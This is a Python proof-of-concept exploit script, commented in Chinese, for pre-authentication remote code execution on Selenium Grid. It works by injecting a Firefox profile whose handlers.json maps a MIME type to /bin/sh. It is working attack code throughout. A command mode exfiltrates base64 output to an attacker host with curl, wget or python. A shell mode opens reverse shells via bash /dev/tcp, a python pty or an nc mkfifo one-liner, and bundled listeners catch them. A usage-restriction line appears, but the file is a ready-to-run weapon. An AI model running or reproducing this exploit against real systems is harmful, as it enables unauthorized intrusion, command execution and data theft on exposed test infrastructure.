#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Selenium Grid 认证前远程代码执行 (Pre-auth RCE) 参数化 PoC
==========================================================
向量：Firefox profile 处理器注入 (profile handler injection)
根因：Grid 把客户端提供的 moz:firefoxOptions.profile 原样下发给 geckodriver，
      Firefox 依其中 handlers.json 把某 MIME 注册到任意可执行文件，随后导航
      到 data:<mime> 即可让该程序执行下载内容。
上游：SeleniumHQ/selenium#9526（官方认定为设计行为，未修复）。
实测：Selenium Grid 4.51.0-SNAPSHOT / Firefox 157，无认证。

两种模式
--------
  cmd    执行任意命令，并将输出 base64 外带 (OOB) 回 --lhost:--lport（可用 --listen 本地接收）
  shell  反弹 shell，回连 --lhost:--lport（bash / python / nc；可用 --listen 本地接管）

仅限获得授权的安全测试 / 自有环境使用。
"""

import argparse
import base64
import io
import json
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer

DEFAULT_MIME = "application/x-ccpoc"
DEFAULT_HANDLER = "/bin/sh"
OUT_FILE = "/tmp/rce_out.txt"


# ---------------------------------------------------------------- HTTP 助手

class ExfilHTTP(BaseHTTPRequestHandler):
    got = None

    def _handle(self):
        q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        d = q.get("d", [""])[0]
        if d:
            ExfilHTTP.got = d
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = _handle
    do_POST = _handle

    def log_message(self, *a):
        pass


def grid_http(base, path, payload=None, method="POST", timeout=90):
    url = base.rstrip("/") + path
    data = json.dumps(payload).encode() if payload is not None else None
    request = urllib.request.Request(
        url, data=data, method=method, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read()
            return response.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return exc.code, {"raw": raw.decode(errors="replace")}
    except Exception as exc:  # noqa: BLE001
        return None, {"exc": str(exc)}


def decode_b64(value):
    pad = "=" * (-len(value) % 4)
    for decoder in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            return decoder((value + pad).encode()).decode(errors="replace")
        except Exception:  # noqa: BLE001
            continue
    return "<decode failed>"


def list_sessions(base, timeout=15):
    """返回目标上所有活动会话的 id 列表。"""
    st, body = grid_http(base, "/status", method="GET", timeout=timeout)
    ids = []
    if st == 200:
        for node in body.get("value", {}).get("nodes", []):
            for slot in node.get("slots", []):
                ses = slot.get("session")
                if ses:
                    sid = ses.get("sessionId") or ses.get("id")
                    if sid:
                        ids.append(sid)
    return ids


def clean_sessions(base):
    """删除目标上所有活动会话，释放被占用的槽位。"""
    ids = list_sessions(base)
    if not ids:
        print("[*] 没有需要清理的活动会话")
        return 0
    print("[*] 发现 %d 个活动会话，开始清理:" % len(ids))
    done = 0
    for sid in ids:
        st, _ = grid_http(base, "/session/%s" % sid, method="DELETE", timeout=20)
        print("    DELETE %s -> %s" % (sid, st if st is not None else "error"))
        if st in (200, 204):
            done += 1
    print("[+] 已清理 %d/%d 个会话" % (done, len(ids)))
    return done


# ---------------------------------------------------------------- payload 构造

def build_profile(mime, handler):
    handlers = {
        "defaultHandlersVersion": {"en-US": 4},
        "mimeTypes": {
            mime: {
                "action": 2,
                "extensions": ["poc"],
                "handlers": [{"name": "poc", "path": handler}],
            }
        },
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("handlers.json", json.dumps(handlers))
    return base64.b64encode(buf.getvalue()).decode()


def build_cmd_payload(cmd, lhost, lport):
    """执行 cmd，输出写文件并 base64 外带；curl/wget/python3 依次回退。"""
    exfil = (
        'D=$(cat {out} 2>/dev/null | base64 -w0 | tr "+/" "-_")\n'
        'U="http://{host}:{port}/c?d=${{D}}"\n'
        'curl -s "$U" >/dev/null 2>&1 '
        '|| wget -q -O /dev/null "$U" >/dev/null 2>&1 '
        '|| python3 -c "import urllib.request,sys;urllib.request.urlopen(sys.argv[1])" "$U" '
        '>/dev/null 2>&1\n'
    ).format(out=OUT_FILE, host=lhost, port=lport)
    return "#!/bin/sh\n( " + cmd + " ) > " + OUT_FILE + " 2>&1\n" + exfil


def build_shell_payload(kind, lhost, lport):
    py = (
        "import socket,os,pty;s=socket.socket();s.connect(('{h}',{p}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"
    ).format(h=lhost, p=lport)
    if kind == "bash":
        body = "bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'".format(h=lhost, p=lport)
    elif kind == "python":
        body = 'python3 -c "%s"' % py
    elif kind == "nc":
        body = ("rm -f /tmp/f;mkfifo /tmp/f;"
                "cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f").format(h=lhost, p=lport)
    else:
        raise ValueError("unknown shell kind: %s" % kind)
    return "#!/bin/sh\n" + body + "\n"


# ---------------------------------------------------------------- 监听器

def start_exfil_listener(lport):
    srv = HTTPServer(("0.0.0.0", lport), ExfilHTTP)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print("[*] OOB 监听已启动: http://0.0.0.0:%d/c?d=<b64>" % lport)
    return srv


def start_reverse_listener(lport, exec_cmd):
    state = {}

    def run():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", lport))
        srv.listen(1)
        print("[*] 反弹 shell 监听已启动: 0.0.0.0:%d，等待回连..." % lport)
        conn, addr = srv.accept()
        state["addr"] = addr
        print("[+] 收到回连: %s:%d" % addr)
        if exec_cmd:
            conn.sendall((exec_cmd + "\n").encode())
            time.sleep(2)
            conn.setblocking(False)
            chunks, end = [], time.time() + 3
            while time.time() < end:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    chunks.append(data)
                except BlockingIOError:
                    time.sleep(0.2)
                except Exception:  # noqa: BLE001
                    break
            state["output"] = b"".join(chunks).decode(errors="replace")
            try:
                conn.sendall(b"exit\n")
            except Exception:  # noqa: BLE001
                pass
        else:
            conn.setblocking(True)

            def pipe(src, dst):
                try:
                    while True:
                        data = src.read(1)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception:  # noqa: BLE001
                    pass

            threading.Thread(target=pipe, args=(sys.stdin.buffer, conn), daemon=True).start()
            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
            except Exception:  # noqa: BLE001
                pass
        conn.close()
        srv.close()

    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return state, thread


# ---------------------------------------------------------------- 触发

def trigger(base, sid, data_url, how, timeout):
    if how == "js":
        st, body = grid_http(base, "/session/%s/execute/sync" % sid,
                             {"script": "window.location.href = arguments[0]; return 'set';",
                              "args": [data_url]}, timeout=timeout)
    else:
        st, body = grid_http(base, "/session/%s/url" % sid, {"url": data_url}, timeout=timeout)
    return st, body


def main():
    ap = argparse.ArgumentParser(
        description="Selenium Grid 认证前 RCE PoC (Firefox profile 注入)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n"
               "  命令外带:  %(prog)s --cmd 'id; hostname' --lhost 172.17.0.1 --lport 9001 --listen\n"
               "  反弹shell: %(prog)s --shell bash --lhost 172.17.0.1 --lport 9001 --listen\n")

    ap.add_argument("--url", default="http://localhost:4444", help="Grid/Hub 地址 (默认 http://localhost:4444)")
    ap.add_argument("--browser", default="firefox", help="目标浏览器 (默认 firefox)")
    ap.add_argument("--mime", default=DEFAULT_MIME, help="自定义 MIME 类型")
    ap.add_argument("--handler", default=DEFAULT_HANDLER, help="被注册执行的程序 (默认 /bin/sh)")
    ap.add_argument("--trigger", choices=["js", "url"], default="js",
                    help="触发方式: js=execute/sync 设 location(非阻塞,默认) / url=POST /url(可能阻塞)")

    mode = ap.add_mutually_exclusive_group(required=False)
    mode.add_argument("--cmd", metavar="CMD", help="命令执行模式：要执行的 shell 命令")
    mode.add_argument("--shell", choices=["bash", "python", "nc"], help="反弹 shell 模式")

    ap.add_argument("--clean-sessions", action="store_true",
                    help="利用前先删除目标上所有活动会话以释放槽位；可单独使用(只清理不利用)")
    ap.add_argument("--lhost", help="回连地址(容器可达的攻击者 IP)")
    ap.add_argument("--lport", type=int, help="回连端口")
    ap.add_argument("--listen", action="store_true", help="本地自动起监听并接收结果")
    ap.add_argument("--exec", dest="exec_cmd", metavar="CMD",
                    help="反弹 shell 模式下连接后自动执行一条命令并取回输出")
    ap.add_argument("--wait", type=int, default=6, help="触发后等待秒数 (默认 6)")
    ap.add_argument("--session-timeout", type=int, default=30,
                    help="创建会话的等待上限秒数 (默认 30；独立节点 maxSessions=1，槽位被占会一直等)")
    ap.add_argument("--keep-session", action="store_true",
                    help="结束后不注销会话 (默认会 DELETE 以释放槽位)")
    ap.add_argument("--container", help="可选：容器名，额外用 docker exec 读取 %s 作证据" % OUT_FILE)
    args = ap.parse_args()

    if not (args.cmd or args.shell or args.clean_sessions):
        ap.error("需要 --cmd / --shell，或 --clean-sessions（可只清理）")
    if (args.cmd or args.shell) and not (args.lhost and args.lport):
        ap.error("利用模式需要 --lhost 和 --lport")

    print("[*] 目标 %s" % args.url)
    if args.cmd:
        print("[*] 模式 cmd: %s | 触发 %s | 回连 %s:%d" % (args.cmd, args.trigger, args.lhost, args.lport))
    elif args.shell:
        print("[*] 模式 shell: %s | 触发 %s | 回连 %s:%d" % (args.shell, args.trigger, args.lhost, args.lport))

    # 可选：先清理旧会话释放槽位
    if args.clean_sessions:
        clean_sessions(args.url)

    # 只清理不利用
    if not (args.cmd or args.shell):
        return 0

    st, body = grid_http(args.url, "/status", method="GET", timeout=15)
    if st == 200:
        nodes = body.get("value", {}).get("nodes", [])
        print("[*] Grid 存活, 版本: %s" % (nodes[0]["version"] if nodes else "unknown"))
    else:
        print("[!] /status -> %s" % st)

    exfil_srv = None
    rev_state = rev_thread = None
    if args.listen:
        if args.cmd:
            exfil_srv = start_exfil_listener(args.lport)
        else:
            rev_state, rev_thread = start_reverse_listener(args.lport, args.exec_cmd)

    # 1) 认证前建会话并注入 profile
    profile = build_profile(args.mime, args.handler)
    st, body = grid_http(args.url, "/session", {"capabilities": {"alwaysMatch": {
        "browserName": args.browser, "moz:firefoxOptions": {"profile": profile}}}},
        timeout=args.session_timeout)
    value = body.get("value", {})
    sid = value.get("sessionId")
    if st != 200 or not sid:
        print("[-] 创建会话失败 (%s): %s" % (st, json.dumps(body)[:400]))
        if body.get("exc"):
            print("[!] 提示：独立节点 maxSessions=1，若已有会话占用槽位，新建会话会一直等待。")
            print("    可先释放：curl -X DELETE %s/session/<旧sessionId>，或重启容器。" % args.url.rstrip("/"))
        return 1
    print("[+] 会话已建立(未认证): %s" % sid)
    if value.get("capabilities", {}).get("moz:firefoxOptions", {}).get("profile"):
        print("[+] 服务端回显注入的 profile: 是")

    # 2) 生成 payload 并触发
    if args.cmd:
        payload = build_cmd_payload(args.cmd, args.lhost, args.lport)
    else:
        payload = build_shell_payload(args.shell, args.lhost, args.lport)
    data_url = "data:%s;charset=utf-8;base64,%s" % (
        args.mime, base64.b64encode(payload.encode()).decode())
    st, body = trigger(args.url, sid, data_url, args.trigger, timeout=20)
    print("[*] 触发(%s): st=%s %s" % (args.trigger, st, json.dumps(body)[:120]))

    # 3) 收取结果
    got = False
    if exfil_srv is not None:
        end = time.time() + args.wait + 20
        while time.time() < end and ExfilHTTP.got is None:
            time.sleep(0.3)
        if ExfilHTTP.got:
            print("[+] 收到外带回显:")
            print("    " + decode_b64(ExfilHTTP.got).replace("\n", "\n    ").rstrip())
            got = True
        else:
            print("[-] 未收到外带回显（检查 --lhost 是否容器可达 / 回连是否被拦）")
        exfil_srv.shutdown()
    elif rev_state is not None:
        rev_thread.join(timeout=args.wait + 25)
        if rev_state.get("addr"):
            print("[+] 回连来自: %s:%d" % rev_state["addr"])
            if "output" in rev_state:
                print("[+] 远程输出:\n    " + rev_state["output"].replace("\n", "\n    ").rstrip())
            got = True
        else:
            print("[-] 未收到回连")
    else:
        time.sleep(args.wait)

    if args.container:
        import subprocess
        r = subprocess.run(["docker", "exec", args.container, "cat", OUT_FILE],
                           capture_output=True, text=True)
        if r.returncode == 0:
            print("[+] 容器内 %s:\n    %s" % (OUT_FILE, r.stdout.replace("\n", "\n    ").rstrip()))
            got = True

    if sid and not args.keep_session:
        grid_http(args.url, "/session/%s" % sid, method="DELETE", timeout=15)
        print("[*] 已注销会话 %s 释放槽位（--keep-session 可保留）" % sid)

    print("[+] 完成。" if got else "[-] 未取得执行证据。")
    return 0 if got else 2


if __name__ == "__main__":
    sys.exit(main())
